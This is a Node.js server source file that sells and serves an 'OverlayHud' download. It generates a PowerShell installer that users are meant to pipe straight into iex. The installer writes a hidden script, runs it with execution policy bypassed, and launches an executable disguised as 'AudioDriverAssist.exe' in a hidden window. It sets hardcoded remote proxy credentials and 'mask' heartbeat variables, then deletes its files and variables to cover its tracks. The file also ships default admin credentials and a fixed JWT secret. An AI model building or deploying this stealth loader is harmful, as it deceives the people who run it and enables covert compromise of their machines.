const express = require("express");
const path = require("path");
const fs = require("fs");
const os = require("os");
const localtunnel = require("localtunnel");
const Database = require("better-sqlite3");
const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");
const crypto = require("crypto");

const PORT = Number(process.env.PORT || 8443);
const HOST = process.env.HOST || "0.0.0.0";
const PUBLIC_DIR = path.join(__dirname, "public");
const STATIC_MAX_AGE = "1d";
const ZIP_FILE = process.env.OVERLAYHUD_ZIP || "OverlayHud-win-x64.zip";
const ASSET_PATH = path.join(PUBLIC_DIR, ZIP_FILE);
const ENABLE_TUNNEL = process.env.PUBLIC_TUNNEL
  ? String(process.env.PUBLIC_TUNNEL).toLowerCase() === "true"
  : true;
const TUNNEL_SUBDOMAIN = process.env.PUBLIC_SUBDOMAIN;
const TUNNEL_REGION = process.env.PUBLIC_TUNNEL_REGION;
const DB_PATH = path.join(__dirname, "data", "admin.db");
const JWT_SECRET = process.env.JWT_SECRET || "overlayhud-secret";
const KEY_ALPHABET = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
function generateKey(length = 12) {
  const chars = KEY_ALPHABET;
  const max = chars.length;
  let result = "";
  for (let i = 0; i < length; i += 1) {
    const idx = crypto.randomInt(0, max);
    result += chars[idx];
  }
  return result;
}
let tunnelInstance;
let isShuttingDown = false;

if (!fs.existsSync(PUBLIC_DIR)) {
  fs.mkdirSync(PUBLIC_DIR, { recursive: true });
}
const DATA_DIR = path.join(__dirname, "data");
if (!fs.existsSync(DATA_DIR)) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
}

const app = express();
app.set("trust proxy", true);
app.use(express.json());

const db = new Database(DB_PATH);
initDb();

app.get("/api/status", (_req, res) => {
  res.json({
    status: "active",
    timestamp: new Date().toISOString(),
  });
});

app.post("/api/auth/login", (req, res) => {
  const { email, password } = req.body || {};
  if (!email || !password) {
    return res.status(400).json({ error: "email and password required" });
  }
  const user = db.prepare("SELECT id, email, password_hash, role FROM users WHERE email = ?").get(email);
  if (!user || !bcrypt.compareSync(password, user.password_hash)) {
    return res.status(401).json({ error: "invalid credentials" });
  }
  const token = issueToken(user);
  res.json({ token, user: { id: user.id, email: user.email, role: user.role } });
});

app.get("/api/admin/users", requireAuth, requireAdmin, (_req, res) => {
  const users = db.prepare("SELECT id, email, role, created_at FROM users ORDER BY created_at DESC").all();
  res.json({ users });
});

app.post("/api/admin/users", requireAuth, requireAdmin, (req, res) => {
  const { email, password, role = "admin" } = req.body || {};
  if (!email || !password) {
    return res.status(400).json({ error: "email and password required" });
  }
  try {
    const hash = bcrypt.hashSync(password, 10);
    const info = db
      .prepare(
        "INSERT INTO users (email, password_hash, role, created_at) VALUES (?, ?, ?, ?)",
      )
      .run(email, hash, role, new Date().toISOString());
    recordAudit(req.user.sub, "create_user", String(info.lastInsertRowid), { email, role });
    res.json({ id: info.lastInsertRowid, email, role });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

app.get("/api/admin/download-items", requireAuth, requireAdmin, (_req, res) => {
  const items = db
    .prepare(
      "SELECT id, name, file_path, price_cents, active, created_at FROM download_items ORDER BY created_at DESC",
    )
    .all();
  res.json({ items });
});

app.post("/api/admin/download-items", requireAuth, requireAdmin, (req, res) => {
  const { name, filePath, priceCents = 0, active = true } = req.body || {};
  if (!name) {
    return res.status(400).json({ error: "name required" });
  }
  const file_path = filePath || `/${ZIP_FILE}`;
  try {
    const info = db
      .prepare(
        "INSERT INTO download_items (name, file_path, price_cents, active, created_at) VALUES (?, ?, ?, ?, ?)",
      )
      .run(name, file_path, Number(priceCents) || 0, active ? 1 : 0, new Date().toISOString());
    recordAudit(req.user.sub, "create_item", String(info.lastInsertRowid), { name, file_path });
    res.json({ id: info.lastInsertRowid, name, file_path, price_cents: priceCents, active });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

app.get("/api/admin/download-keys", requireAuth, requireAdmin, (_req, res) => {
  const keys = db
    .prepare(
      `SELECT k.id, k.key, k.download_item_id, k.user_id, k.max_uses, k.uses, k.expires_at, k.created_at, i.name AS item_name
       FROM download_keys k
       JOIN download_items i ON k.download_item_id = i.id
       ORDER BY k.created_at DESC
       LIMIT 200`,
    )
    .all();
  res.json({ keys });
});

app.post("/api/admin/download-keys", requireAuth, requireAdmin, (req, res) => {
  const { downloadItemId, maxUses = 1, expiresAt = null, userId = null } = req.body || {};
  if (!downloadItemId) {
    return res.status(400).json({ error: "downloadItemId required" });
  }
  try {
    const key = generateKey();
    const now = new Date().toISOString();
    db.prepare(
      "INSERT INTO download_keys (key, download_item_id, user_id, max_uses, uses, expires_at, created_at, created_by) VALUES (?, ?, ?, ?, 0, ?, ?, ?)",
    ).run(
      key,
      downloadItemId,
      userId,
      Number(maxUses) || 1,
      expiresAt || null,
      now,
      req.user.sub,
    );
    recordAudit(req.user.sub, "create_key", key, { downloadItemId, maxUses, expiresAt, userId });
    res.json({ key });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

app.post("/api/purchase/mock", (req, res) => {
  const { downloadItemId } = req.body || {};
  const itemId = downloadItemId || ensureDefaultItem();
  if (!itemId) {
    return res.status(500).json({ error: "no download item available" });
  }
  const key = generateKey();
  db.prepare(
    "INSERT INTO download_keys (key, download_item_id, max_uses, uses, created_at) VALUES (?, ?, 1, 0, ?)",
  ).run(key, itemId, new Date().toISOString());
  res.json({ key, message: "Mock purchase successful" });
});

app.post("/api/claim/:key", (req, res) => {
  const keyParam = req.params.key;
  const row = db
    .prepare(
      `SELECT k.id, k.key, k.max_uses, k.uses, k.expires_at, i.file_path
       FROM download_keys k
       JOIN download_items i ON k.download_item_id = i.id
       WHERE k.key = ?`,
    )
    .get(keyParam);

  if (!row) {
    return res.status(404).json({ error: "invalid key" });
  }
  if (row.expires_at && new Date(row.expires_at) < new Date()) {
    return res.status(400).json({ error: "key expired" });
  }
  if (row.uses >= row.max_uses) {
    return res.status(400).json({ error: "key already used" });
  }

  db.prepare("UPDATE download_keys SET uses = uses + 1 WHERE id = ?").run(row.id);
  const downloadUrl = row.file_path || `/${ZIP_FILE}`;
  res.json({ downloadUrl });
});
app.get("/health", (_req, res) => {
  const exists = fs.existsSync(ASSET_PATH);

  res.json({
    status: "ok",
    assetFound: exists,
    asset: ZIP_FILE,
  });
});

app.get("/download", (req, res, next) => {
  if (!fs.existsSync(ASSET_PATH)) {
    return res.status(404).json({
      error: `File ${ZIP_FILE} not found in ${PUBLIC_DIR}`,
    });
  }

  console.log(`[${new Date().toISOString()}] download starting for ${req.ip}`);
  res.setHeader("Cache-Control", `public, max-age=${24 * 60 * 60}`);
  try {
    const stat = fs.statSync(ASSET_PATH);
    res.setHeader("Content-Length", stat.size);
  } catch (_) {
    // best effort; ignore stat errors
  }

  res.download(ASSET_PATH, ZIP_FILE, (err) => {
    if (err) {
      return next(err);
    }
    console.log(`[${new Date().toISOString()}] download completed for ${req.ip}`);
  });
});

app.get("/install.ps1", (req, res) => {
  if (!fs.existsSync(ASSET_PATH)) {
    return res.status(404).type("text/plain").send(`# Asset missing
Write-Host "OverlayHud zip not found on server. Ask the host to upload ${ZIP_FILE}."
`);
  }

  const downloadBase = getBaseUrl(req);
  if (!downloadBase) {
    console.error("install.ps1 request missing host; cannot build download URL");
    return res
      .status(500)
      .type("text/plain")
      .send('Write-Host "Installer cannot determine download URL (host missing)."');
  }
  const script = buildPowerShellScript(`${downloadBase}/${ZIP_FILE}`);

  console.log(`[${new Date().toISOString()}] install.ps1 served to ${req.ip}`);
  res.setHeader("Cache-Control", `public, max-age=${24 * 60 * 60}`);
  res.setHeader("Content-Disposition", "attachment; filename=install.ps1");
  res.type("text/plain").send(script);
});

app.use(
  express.static(PUBLIC_DIR, {
    maxAge: STATIC_MAX_AGE,
  }),
);

app.get("/", (_req, res) => {
  const template = `
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <title>OverlayHud Downloads</title>
    <style>
      body {
        font-family: "Segoe UI", system-ui, sans-serif;
        margin: 2rem auto;
        max-width: 640px;
        color: #f3f3f3;
        background: #070a10;
      }
      a {
        color: #6ec1ff;
        text-decoration: none;
        border-bottom: 1px dotted #6ec1ff;
      }
      .card {
        background: rgba(255, 255, 255, 0.05);
        padding: 1.5rem;
        border-radius: 16px;
        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.45);
      }
    </style>
  </head>
  <body>
    <div class="card">
      <h1>OverlayHud download</h1>
      <p>Drop the latest <code>${ZIP_FILE}</code> into <code>${PUBLIC_DIR}</code> and this endpoint will serve it.</p>
      <ul>
        <li><a href="/download" download>Download via /download</a></li>
        <li><a href="/${ZIP_FILE}" download>Direct file link</a></li>
        <li><a href="/health">Health check</a></li>
        <li><code>irm http://YOUR-HOST:${PORT}/install.ps1 \| iex</code></li>
      </ul>
      <p>PowerShell installer snippet:</p>
      <pre>
$url = "http://YOUR-HOST:${PORT}/${ZIP_FILE}"
$tmp = Join-Path $env:TEMP "OverlayHud.zip"
Invoke-WebRequest -Uri $url -OutFile $tmp
Expand-Archive -Path $tmp -DestinationPath "$env:LOCALAPPDATA\\OverlayHudDeploy" -Force
Start-Process "$env:LOCALAPPDATA\\OverlayHudDeploy\\OverlayHud.exe"
      </pre>
    </div>
  </body>
</html>`;

  res.send(template);
});

app.use((err, _req, res, _next) => {
  console.error(err);
  res.status(500).json({ error: err.message });
});

const server = app.listen(PORT, HOST, () => {
  const localUrl = `http://localhost:${PORT}`;
  const lanUrl = getLanUrl(PORT);

  console.log(`OverlayHud host listening on ${localUrl}`);
  if (lanUrl) {
    console.log(`LAN link: ${lanUrl}`);
  } else {
    console.log("LAN link could not be detected (no active IPv4 interface).");
  }
  logLinkSet("Local", localUrl);
  if (lanUrl) {
    logLinkSet("LAN   ", lanUrl);
  }

  if (!fs.existsSync(ASSET_PATH)) {
    console.warn(
      `Note: ${ZIP_FILE} not found in ${PUBLIC_DIR}. Upload/publish before sharing the link.`,
    );
  }

  if (ENABLE_TUNNEL) {
    openTunnel().catch((err) => {
      console.error("Failed to start public tunnel:", err.message);
    });
  }
});

async function openTunnel() {
  const tunnelOptions = {
    port: PORT,
  };

  if (TUNNEL_SUBDOMAIN) {
    tunnelOptions.subdomain = TUNNEL_SUBDOMAIN;
  }

  if (TUNNEL_REGION) {
    tunnelOptions.region = TUNNEL_REGION;
  }

  tunnelInstance = await localtunnel(tunnelOptions);
  logLinkSet("Public", tunnelInstance.url, { recommend: true });
  tunnelInstance.on("close", () => console.log("Public tunnel closed."));
}

function getLanUrl(port) {
  const nets = os.networkInterfaces();
  for (const name of Object.keys(nets)) {
    for (const net of nets[name] || []) {
      if (net.family === "IPv4" && !net.internal) {
        return `http://${net.address}:${port}`;
      }
    }
  }
  return null;
}

function logLinkSet(label, baseUrl, options = {}) {
  const normalized = normalizeBaseUrl(baseUrl);
  const downloadUrl = `${normalized}/${ZIP_FILE}`;
  const installerUrl = `${normalized}/install.ps1`;
  const note = options.recommend ? " (recommended HTTPS)" : "";

  console.log(`${label} site${note}: ${normalized}`);
  console.log(`${label} download${note}: ${downloadUrl}`);
  console.log(`${label} install cmd${note}: irm ${installerUrl} | iex`);
}

function normalizeBaseUrl(url) {
  return url.endsWith("/") ? url.slice(0, -1) : url;
}

function getBaseUrl(req) {
  const host = req.headers.host || process.env.PUBLIC_BASE_URL;
  if (!host) {
    return "";
  }
  const proto = req.headers["x-forwarded-proto"] || req.protocol || "https";
  return `${proto}://${host}`;
}

function getExecutableName() {
  return process.env.OVERLAYHUD_EXE || "AudioDriverAssist.exe";
}

function buildPowerShellScript(downloadUrl) {
  const exeName = getExecutableName();
  const envBlock = buildClientEnvBlock();
  const envCleanup = buildClientEnvCleanupBlock();
  return `
$downloadUrl = "${downloadUrl}"
if ([string]::IsNullOrWhiteSpace($downloadUrl)) {
    Write-Host "Download URL missing; aborting."
    exit 1
}

function New-RandomTempName {
    param([string]$extension = "")
    $base = [System.IO.Path]::GetRandomFileName()
    $base = $base -replace "[^A-Za-z0-9\\.]", ""
    if (-not $base.StartsWith("~")) {
        $base = "~" + $base
    }
    if (-not [string]::IsNullOrWhiteSpace($extension)) {
        if (-not $extension.StartsWith(".")) {
            $extension = "." + $extension
        }
        return "$base$extension"
    }
    return $base
}

$sessionDir = Join-Path $env:TEMP (New-RandomTempName)
$logPath = Join-Path $sessionDir "install.log"
Write-Host "Installer log (hidden run): $logPath"

$tempScript = Join-Path $env:TEMP (New-RandomTempName -extension "ps1")
$payload = @'
param(
    [string]$downloadUrl,
    [string]$sessionDir,
    [string]$logPath
)

$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"
$downloadTimeoutSec = 120

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
} catch {
    # best-effort
}

function Write-Log([string] $msg) {
    $stamp = (Get-Date).ToString("o")
    $line = "$stamp\`t$msg"
    Add-Content -Path $logPath -Value $line
}

New-Item -ItemType Directory -Path $sessionDir -Force | Out-Null
New-Item -ItemType File -Path $logPath -Force | Out-Null
Write-Log "Preparing temporary session at $sessionDir (download URL: $downloadUrl)"

$zipPath = Join-Path $sessionDir "OverlayHud.zip"

Write-Log "Downloading OverlayHud from $downloadUrl..."
try {
    Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath -UseBasicParsing -TimeoutSec $downloadTimeoutSec
    Write-Log "Download completed."
} catch {
    Write-Log "Download failed: $($_.Exception.Message)"
    exit 1
}

$null = Unblock-File -Path $zipPath -ErrorAction SilentlyContinue

try {
    Expand-Archive -Path $zipPath -DestinationPath $sessionDir -Force
    Remove-Item $zipPath -Force
    Write-Log "Package extracted."
} catch {
    Write-Log "Extraction failed: $($_.Exception.Message)"
    exit 1
}

# Apply environment settings for OverlayHud
${envBlock}
$env:OVERLAYHUD_SESSION_DIR = $sessionDir
$env:OVERLAYHUD_INSTALL_SCRIPT = $tempScript
$env:OVERLAYHUD_LOG_PATH = $logPath

$webViewInstaller = Join-Path $sessionDir "MicrosoftEdgeWebView2RuntimeInstaller.exe"
if (Test-Path $webViewInstaller) {
    Write-Log "Installing WebView2 runtime (silent)..."
    try {
        $p = Start-Process -FilePath $webViewInstaller -ArgumentList "/silent","/install" -PassThru -WindowStyle Hidden
        $p.WaitForExit()
        Write-Log "WebView2 runtime installer exit code: $($p.ExitCode)"
    } catch {
        Write-Log "WebView2 runtime install failed: $($_.Exception.Message)"
    }
} else {
    Write-Log "WebView2 runtime installer not found; continuing without bootstrap."
}

$exeName = "${exeName}"
$exePath = Join-Path $sessionDir $exeName

if (-not (Test-Path $exePath)) {
    $candidate = Get-ChildItem -Path $sessionDir -Filter "*.exe" -File -Recurse | Select-Object -First 1
    if ($candidate) {
        $exePath = $candidate.FullName
    }
}

if (-not (Test-Path $exePath)) {
    Write-Log "OverlayHud executable not found after extraction."
    exit 1
}

$null = Unblock-File -Path $exePath -ErrorAction SilentlyContinue

Write-Log "Launching $exePath (will clean up after exit)"
try {
    $process = Start-Process -FilePath $exePath -WorkingDirectory $sessionDir -PassThru -WindowStyle Hidden -ErrorAction Stop
    Write-Log "Launch started; background cleanup scheduled. PID=$($process.Id)"
    Start-Sleep -Seconds 1
    if ($process.HasExited) {
        Write-Log "Process exited immediately; attempting fallback launch via shell execute"
        try {
            $psi = New-Object System.Diagnostics.ProcessStartInfo
            $psi.FileName = $exePath
            $psi.WorkingDirectory = $sessionDir
            $psi.UseShellExecute = $true
            $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
            $psi.CreateNoWindow = $true
            $process = [System.Diagnostics.Process]::Start($psi)
            if ($process) {
                Write-Log "Fallback launch started. PID=$($process.Id)"
            } else {
                Write-Log "Fallback launch returned null process instance."
            }
        } catch {
            Write-Log "Fallback launch failed: $($_.Exception.Message)"
        }
    } else {
        Write-Log "Process state: running"
    }
} catch {
    Write-Log "Launch failed: $($_.Exception.Message)"
    exit 1
}

Start-Job -ScriptBlock {
    param($pid, $path)
    try {
        Wait-Process -Id $pid -ErrorAction SilentlyContinue
    } catch {}
    Start-Sleep -Seconds 2
    if (Test-Path $path) {
        Remove-Item $path -Recurse -Force -ErrorAction SilentlyContinue
    }
} -ArgumentList $process.Id, $sessionDir | Out-Null

Write-Log "OverlayHud is running; close the app to delete the session."
Write-Log "Install finished."

# Clean up environment variables we set
${envCleanup}

# Clear sensitive script variables
Remove-Variable downloadUrl, sessionDir, zipPath, exeName, exePath, process, logPath -ErrorAction SilentlyContinue
'@

Set-Content -Path $tempScript -Value $payload -Encoding UTF8

Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-NoProfile","-ExecutionPolicy","Bypass","-File",$tempScript,"-downloadUrl",$downloadUrl,"-sessionDir",$sessionDir,"-logPath",$logPath

Write-Host "Installer is running hidden. Log: $logPath"
exit
`.trimStart();
}

function buildClientEnvBlock() {
  const entries = {
    PORT: process.env.PORT,
    HOST: process.env.HOST,
    OVERLAYHUD_ZIP: process.env.OVERLAYHUD_ZIP,
    PUBLIC_TUNNEL: process.env.PUBLIC_TUNNEL,
    PUBLIC_SUBDOMAIN: process.env.PUBLIC_SUBDOMAIN,
    PUBLIC_TUNNEL_REGION: process.env.PUBLIC_TUNNEL_REGION,
    MASK_USER_AGENT: process.env.MASK_USER_AGENT,
    MASK_HEARTBEAT_URL: process.env.MASK_HEARTBEAT_URL,
    OVERLAYHUD_EXE: process.env.OVERLAYHUD_EXE,
    PROXY_HOST: process.env.PROXY_HOST || "84.55.7.37",
    PROXY_PORT: process.env.PROXY_PORT || "5432",
    PROXY_USER: process.env.PROXY_USER || "j3vun",
    PROXY_PASS: process.env.PROXY_PASS || "uu12zs79",
  };

  return Object.entries(entries)
    .filter(([, value]) => typeof value === "string" && value.trim().length > 0)
    .map(([key, value]) => {
      const sanitized = String(value).replace(/"/g, '`"').replace(/\r?\n/g, " ");
      return `$env:${key}="${sanitized}"`;
    })
    .join("\n");
}

function buildClientEnvCleanupBlock() {
  const keys = [
    "PORT",
    "HOST",
    "OVERLAYHUD_ZIP",
    "PUBLIC_TUNNEL",
    "PUBLIC_SUBDOMAIN",
    "PUBLIC_TUNNEL_REGION",
    "MASK_USER_AGENT",
    "MASK_HEARTBEAT_URL",
    "OVERLAYHUD_EXE",
    "PROXY_HOST",
    "PROXY_PORT",
    "PROXY_USER",
    "PROXY_PASS",
    "OVERLAYHUD_SESSION_DIR",
    "OVERLAYHUD_INSTALL_SCRIPT",
    "OVERLAYHUD_LOG_PATH",
  ];

  return keys
    .map((key) => `Remove-Item "Env:${key}" -ErrorAction SilentlyContinue`)
    .join("\n");
}

function initDb() {
  db.pragma("journal_mode = WAL");
  db.exec(`
    CREATE TABLE IF NOT EXISTS users (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      email TEXT NOT NULL UNIQUE,
      password_hash TEXT NOT NULL,
      role TEXT NOT NULL DEFAULT 'admin',
      created_at TEXT NOT NULL
    );
    CREATE TABLE IF NOT EXISTS download_items (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      name TEXT NOT NULL,
      file_path TEXT NOT NULL,
      price_cents INTEGER DEFAULT 0,
      active INTEGER NOT NULL DEFAULT 1,
      created_at TEXT NOT NULL
    );
    CREATE TABLE IF NOT EXISTS download_keys (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      key TEXT NOT NULL UNIQUE,
      download_item_id INTEGER NOT NULL,
      user_id INTEGER,
      max_uses INTEGER NOT NULL DEFAULT 1,
      uses INTEGER NOT NULL DEFAULT 0,
      expires_at TEXT,
      created_at TEXT NOT NULL,
      created_by INTEGER,
      FOREIGN KEY(download_item_id) REFERENCES download_items(id),
      FOREIGN KEY(user_id) REFERENCES users(id),
      FOREIGN KEY(created_by) REFERENCES users(id)
    );
    CREATE TABLE IF NOT EXISTS audit_log (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      actor_user_id INTEGER,
      action TEXT NOT NULL,
      subject TEXT,
      meta_json TEXT,
      created_at TEXT NOT NULL,
      FOREIGN KEY(actor_user_id) REFERENCES users(id)
    );
  `);

  const adminEmail = process.env.ADMIN_EMAIL || "admin@overlayhud.local";
  const adminPass = process.env.ADMIN_PASSWORD || "admin123";
  const exists = db.prepare("SELECT id FROM users WHERE email = ?").get(adminEmail);
  if (!exists) {
    const hash = bcrypt.hashSync(adminPass, 10);
    db.prepare(
      "INSERT INTO users (email, password_hash, role, created_at) VALUES (?, ?, 'admin', ?)",
    ).run(adminEmail, hash, new Date().toISOString());
    console.log(`Seeded admin user ${adminEmail} / ${adminPass}`);
  }
}

function issueToken(user) {
  return jwt.sign(
    { sub: user.id, role: user.role, email: user.email },
    JWT_SECRET,
    { expiresIn: "1d" },
  );
}

function requireAuth(req, res, next) {
  const auth = req.headers.authorization;
  if (!auth || !auth.startsWith("Bearer ")) {
    return res.status(401).json({ error: "unauthorized" });
  }
  const token = auth.slice("Bearer ".length);
  try {
    const payload = jwt.verify(token, JWT_SECRET);
    req.user = payload;
    return next();
  } catch (err) {
    return res.status(401).json({ error: "unauthorized" });
  }
}

function requireAdmin(req, res, next) {
  if (!req.user || req.user.role !== "admin") {
    return res.status(403).json({ error: "forbidden" });
  }
  next();
}

function recordAudit(actorId, action, subject, meta = {}) {
  try {
    db.prepare(
      "INSERT INTO audit_log (actor_user_id, action, subject, meta_json, created_at) VALUES (?, ?, ?, ?, ?)",
    ).run(actorId, action, subject, JSON.stringify(meta), new Date().toISOString());
  } catch (err) {
    console.error("Failed to record audit:", err.message);
  }
}

function ensureDefaultItem() {
  const existing = db.prepare("SELECT id FROM download_items ORDER BY id LIMIT 1").get();
  if (existing) return existing.id;
  const info = db
    .prepare(
      "INSERT INTO download_items (name, file_path, price_cents, active, created_at) VALUES (?, ?, 0, 1, ?)",
    )
    .run("OverlayHud Package", `/${ZIP_FILE}`, new Date().toISOString());
  return info.lastInsertRowid;
}

async function shutdown(reason = "SIGTERM") {
  if (isShuttingDown) {
    return;
  }

  isShuttingDown = true;
  console.log(`Shutting down OverlayHud host (${reason})...`);

  try {
    if (tunnelInstance) {
      tunnelInstance.close();
    }

    await new Promise((resolve) => server.close(resolve));
  } catch (err) {
    console.error("Error during shutdown:", err);
  } finally {
    process.exit(0);
  }
}

process.on("SIGINT", () => shutdown("SIGINT"));
process.on("SIGTERM", () => shutdown("SIGTERM"));
process.on("uncaughtException", (error) => {
  console.error("Uncaught exception:", error);
  shutdown("uncaughtException");
});

